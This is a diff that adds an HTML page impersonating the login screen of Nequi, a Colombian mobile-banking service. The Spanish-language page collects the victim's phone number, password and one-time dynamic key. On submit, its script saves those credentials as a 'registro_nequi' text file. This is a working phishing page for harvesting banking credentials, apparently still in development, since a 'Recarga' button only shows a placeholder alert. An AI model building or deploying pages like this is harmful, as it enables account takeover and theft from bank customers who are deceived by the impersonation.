@@ -1,0 +1,427 @@
+﻿<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nequi - Entra a tu Nequi</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #fce7f3 0%, #fbcfe8 50%, #f9a8d4 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            padding: 20px 40px;
+            background: white;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 2px;
+        }
+
+        .logo-dot {
+            width: 8px;
+            height: 8px;
+            background: #ec4899;
+            border-radius: 50%;
+        }
+
+        .logo-text {
+            font-size: 32px;
+            font-weight: 700;
+            color: #1e293b;
+        }
+
+        .recarga-btn {
+            background: #ec4899;
+            color: white;
+            padding: 12px 32px;
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .recarga-btn:hover {
+            background: #db2777;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(236, 72, 153, 0.4);
+        }
+
+        .main-content {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 40px 20px;
+        }
+
+        .login-card {
+            background: white;
+            border-radius: 24px;
+            padding: 50px 60px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.1);
+            max-width: 480px;
+            width: 100%;
+        }
+
+        .login-title {
+            font-size: 28px;
+            font-weight: 700;
+            color: #1e293b;
+            text-align: center;
+            margin-bottom: 12px;
+        }
+
+        .login-subtitle {
+            font-size: 15px;
+            color: #64748b;
+            text-align: center;
+            margin-bottom: 40px;
+            line-height: 1.5;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .phone-input-wrapper {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+
+        .country-select {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 14px 16px;
+            border: 2px solid #e5e7eb;
+            border-radius: 12px;
+            background: white;
+            cursor: pointer;
+            transition: all 0.3s;
+            min-width: 100px;
+        }
+
+        .country-select:hover {
+            border-color: #ec4899;
+        }
+
+        .flag {
+            width: 24px;
+            height: 18px;
+            background: linear-gradient(to bottom, #FFCD00 0%, #FFCD00 33.33%, #0033A0 33.33%, #0033A0 66.66%, #CE1126 66.66%, #CE1126 100%);
+            border-radius: 2px;
+        }
+
+        .country-code {
+            font-weight: 600;
+            color: #1e293b;
+        }
+
+        .dropdown-arrow {
+            width: 0;
+            height: 0;
+            border-left: 4px solid transparent;
+            border-right: 4px solid transparent;
+            border-top: 5px solid #64748b;
+            margin-left: 4px;
+        }
+
+        input {
+            width: 100%;
+            padding: 16px 20px;
+            border: 2px solid #e5e7eb;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.3s;
+            outline: none;
+            color: #1e293b;
+        }
+
+        input:focus {
+            border-color: #ec4899;
+            box-shadow: 0 0 0 4px rgba(236, 72, 153, 0.1);
+        }
+
+        input::placeholder {
+            color: #94a3b8;
+        }
+
+        .phone-input {
+            flex: 1;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #475569;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .checkbox-group {
+            margin: 30px 0;
+        }
+
+        .checkbox-wrapper {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            padding: 20px;
+            border: 2px solid #e5e7eb;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .checkbox-wrapper:hover {
+            border-color: #ec4899;
+            background: #fdf2f8;
+        }
+
+        .checkbox-wrapper.checked {
+            border-color: #ec4899;
+            background: #fdf2f8;
+        }
+
+        .custom-checkbox {
+            width: 24px;
+            height: 24px;
+            border: 2px solid #ec4899;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        .custom-checkbox.checked {
+            background: #ec4899;
+        }
+
+        .custom-checkbox.checked::after {
+            content: '';
+            width: 8px;
+            height: 8px;
+            background: white;
+            border-radius: 50%;
+        }
+
+        .checkbox-label {
+            color: #475569;
+            font-size: 15px;
+            line-height: 1.5;
+            user-select: none;
+        }
+
+        input[type="checkbox"] {
+            display: none;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 16px;
+            background: #ec4899;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+        }
+
+        .submit-btn:hover {
+            background: #db2777;
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(236, 72, 153, 0.3);
+        }
+
+        .submit-btn:disabled {
+            background: #fda4af;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .watermark {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 14px;
+        }
+
+        @media (max-width: 768px) {
+            .login-card {
+                padding: 40px 30px;
+            }
+
+            .header {
+                padding: 15px 20px;
+            }
+
+            .phone-input-wrapper {
+                flex-direction: column;
+            }
+
+            .country-select {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="logo">
+            <div class="logo-dot"></div>
+            <div class="logo-text">Nequi</div>
+        </div>
+        <button class="recarga-btn" onclick="handleRecarga()">Recarga</button>
+    </header>
+
+    <div class="main-content">
+        <div class="login-card">
+            <h1 class="login-title">Entra a tu Nequi</h1>
+            <p class="login-subtitle">Podrás bloquear tu Nequi, consultar tus datos.</p>
+
+            <form id="nequiForm">
+                <div class="form-group">
+                    <div class="phone-input-wrapper">
+                        <div class="country-select">
+                            <div class="flag"></div>
+                            <span class="country-code">+57</span>
+                            <div class="dropdown-arrow"></div>
+                        </div>
+                        <input type="tel" 
+                               id="phoneNumber" 
+                               class="phone-input" 
+                               placeholder="Número de celular"
+                               maxlength="10"
+                               required>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="password">Contraseña</label>
+                    <input type="password" 
+                           id="password" 
+                           placeholder="Contraseña"
+                           required>
+                </div>
+
+                <div class="form-group">
+                    <label for="dynamicKey">Clave dinámica</label>
+                    <input type="text" 
+                           id="dynamicKey" 
+                           placeholder="Clave dinámica"
+                           maxlength="6"
+                           required>
+                </div>
+
+                <div class="checkbox-group">
+                    <label class="checkbox-wrapper" id="checkboxWrapper">
+                        <input type="checkbox" id="humanCheck">
+                        <div class="custom-checkbox" id="customCheckbox"></div>
+                        <span class="checkbox-label">Confirmo que soy una persona real.</span>
+                    </label>
+                </div>
+
+                <button type="submit" class="submit-btn" id="submitBtn" disabled>Entra</button>
+            </form>
+        </div>
+    </div>
+
+    <div class="watermark">Activar Windows<br>Ve a Configuración para activar Windows.</div>
+
+    <script>
+        const checkboxWrapper = document.getElementById('checkboxWrapper');
+        const humanCheck = document.getElementById('humanCheck');
+        const customCheckbox = document.getElementById('customCheckbox');
+        const submitBtn = document.getElementById('submitBtn');
+
+        checkboxWrapper.addEventListener('click', function() {
+            humanCheck.checked = !humanCheck.checked;
+            
+            if (humanCheck.checked) {
+                customCheckbox.classList.add('checked');
+                checkboxWrapper.classList.add('checked');
+                submitBtn.disabled = false;
+            } else {
+                customCheckbox.classList.remove('checked');
+                checkboxWrapper.classList.remove('checked');
+                submitBtn.disabled = true;
+            }
+        });
+
+        document.getElementById('nequiForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const phoneNumber = document.getElementById('phoneNumber').value;
+            const password = document.getElementById('password').value;
+            const dynamicKey = document.getElementById('dynamicKey').value;
+            const timestamp = new Date().toLocaleString('es-CO');
+            
+            const content = `=================================
+REGISTRO DE INICIO DE SESIÓN NEQUI
+=================================
+Fecha y hora: ${timestamp}
+Número de celular: +57 ${phoneNumber}
+Contraseña: ${password}
+Clave dinámica: ${dynamicKey}
+Confirmación humana: Sí
+=================================\n\n`;
+            
+            const blob = new Blob([content], { type: 'text/plain' });
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = `registro_nequi_${Date.now()}.txt`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            
+            document.getElementById('nequiForm').reset();
+            humanCheck.checked = false;
+            customCheckbox.classList.remove('checked');
+            checkboxWrapper.classList.remove('checked');
+            submitBtn.disabled = true;
+            
+            //alert('Datos registrados exitosamente. El archivo se ha descargado.');
+        });
+
+        function handleRecarga() {
+            alert('Funcionalidad de Recarga - En desarrollo');
+        }
+
+        // Solo permitir números en el campo de teléfono
+        document.getElementById('phoneNumber').addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
+
+        // Solo permitir números en clave dinámica
+        document.getElementById('dynamicKey').addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
+    </script>
+</body>
+</html>
